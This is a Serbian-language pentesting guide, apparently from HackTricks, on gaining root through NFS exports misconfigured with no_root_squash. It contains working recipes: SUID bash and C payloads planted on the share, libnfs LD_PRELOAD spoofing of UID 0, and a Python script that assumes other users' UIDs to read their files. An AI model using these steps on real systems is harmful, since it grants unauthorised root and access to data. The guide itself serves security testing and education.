# NFS No Root Squash pogrešna konfiguracija i eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije o squashing-u

Kod NFS AUTH_SYS/AUTH_UNIX, server zasniva provere dozvola za fajlove na vrednostima `uid` i `gid` koje se šalju u svakom RPC zahtevu. Drugi bezbednosni režimi, kao što je Kerberos, koriste drugačije kredencijale, a server može mapirati numeričke kredencijale pre provere dozvola.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapira svaki UID i GID na anonimni nalog, koji je na Linuxu podrazumevano `nobody` (65534). `no_all_squash` je podrazumevana postavka za zahteve koji nisu od root-a.<sup>[[4]](#references)</sup>
- **`root_squash`**: Ovo je podrazumevana postavka na Linuxu i mapira zahteve sa UID/GID 0 (root) na anonimni nalog; ostali UID-ovi i GID-ovi se ne squash-uju.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Isključuje root squashing, pa zahtevi sa UID/GID 0 mogu biti obrađeni kao root na serveru.<sup>[[4]](#references)</sup>

Ako dozvoljeni klijent može da montira upisiv export u **`/etc/exports`** koji je konfigurisan sa **`no_root_squash`**, njegovi zahtevi sa UID/GID 0 mogu da upisuju u njega kao root korisnik servera.<sup>[[4]](#references)</sup>

`root_squash` mapira samo UID/GID 0; uz AUTH_SYS, **nenulti numerički UID/GID** dozvoljenog klijenta i dalje može da odgovara drugom nalogu na serveru. Zato upisiv export može da postane putanja između korisnika čak i uz root squashing, ako klijent može da kreira fajl sa tim numeričkim identitetom, a server dozvoljava pristup. Za SUID/SGID prenos takođe proverite vlasnika kreiranog fajla, dozvolu za izvršavanje, stanje `nosuid` opcije za mount na serveru, ACL-ove i SELinux ili druge bezbednosne politike. Sama putanja export-a, opcija `rw` ili podudaranje brojeva ne dokazuju da klijent ima dozvolu, da je export aktivan ili da oba hosta koriste isto efektivno mapiranje identiteta. Pasivno pregledajte `/etc/exports` i lokalne metapodatke; nemojte montirati novi share niti kreirati testni fajl tokom enumeracije.<sup>[[4]](#references)[[5]](#references)</sup>

Više informacija o **NFS** potražite u:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacija privilegija

### Remote Exploit

Opcija 1 pomoću bash-a:
- Na dozvoljenom klijentu, montirajte upisiv export kao root, kopirajte **`/bin/bash`** u njega, postavite njegov **SUID** bit i izvršite ga sa mount-a na žrtvi koji ne koristi `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Da bi otpremljeni fajl ostao u vlasništvu root-a, server mora da koristi **`no_root_squash`**. Ako je root squash-ovan, SUID binarna datoteka za drugi nalog moguća je samo ako klijent može legitimno da je kreira ili bude njen vlasnik koristeći numerički UID/GID tog naloga.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opcija 2 pomoću kompajliranog C koda:
- Montirajte direktorijum sa dozvoljenog klijenta, kopirajte kompajlirani payload koji zloupotrebljava SUID dozvole, postavite njegov **SUID** bit i izvršite ga na žrtvi (pogledajte neke [C SUID payload-e](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ista ograničenja kao i ranije

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Imajte na umu da, ako možete da napravite **tunel sa svoje mašine do žrtvine mašine, i dalje možete da koristite Remote verziju za iskorišćavanje ovog podizanja privilegija tunelovanjem potrebnih portova**.\
> Sledeći trik je koristan kada `/etc/exports` ograničava export na IP adresu žrtve: udaljeni klijent ne može da ga montira, ali lokalna tehnika može da radi preko share-a koji je već montiran na dozvoljenom hostu.<sup>[[2]](#references)</sup>\
> Za ovu neprivilegovanu libnfs metodu, export u **`/etc/exports`** mora da koristi oznaku `insecure` kako bi proces mogao da koristi izvorni port koji nije rezervisan; `secure` je podrazumevana vrednost, mada proces koji može da veže rezervisani port ne mora da koristi ovu opciju.<sup>[[1]](#references)[[4]](#references)</sup>

### Osnovne informacije

NFSv3 AUTH_UNIX klijent uključuje svoj efektivni UID, GID i grupe u svaki poziv, a server ih koristi za proveru dozvola. Ova lokalna tehnika zloupotrebljava taj model falsifikovanjem RPC akreditiva putem [libnfs](https://github.com/sahlberg/libnfs); njegov preload modul podržava menjanje UID/GID vrednosti u NFS kontekstu.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompajliranje biblioteke

Primer za libnfs može zahtevati izmene za ciljno jezgro; ovde opisani vodič posebno napominje da pre kompajliranja preload modula treba zakomentarisati fallocate sistemske pozive.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Izvođenje Exploita

Primer pravi mali C pomoćni program koji pokreće shell, zatim ga postavlja na share i koristi `ld_nfs.so` sa UID 0 u NFS kontekstu da bi dobio SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompajlirajte exploit kod:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Postavite exploit na deljeni direktorijum i izmenite njegove dozvole lažiranjem UID-a**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Pokrenite exploit da biste stekli root privilegije**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell za prikriveni pristup datotekama

Kada se dobije root pristup, ovaj obrazac `nfsh.py` postavlja efektivni UID na UID ciljne datoteke pre pokretanja komande, omogućavajući pristup bez rekurzivnog menjanja vlasništva.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Pokreni ovako:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Priča o manje poznatom NFS privesc-u](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — stranica Linux priručnika](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifikacija protokola NFS verzije 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
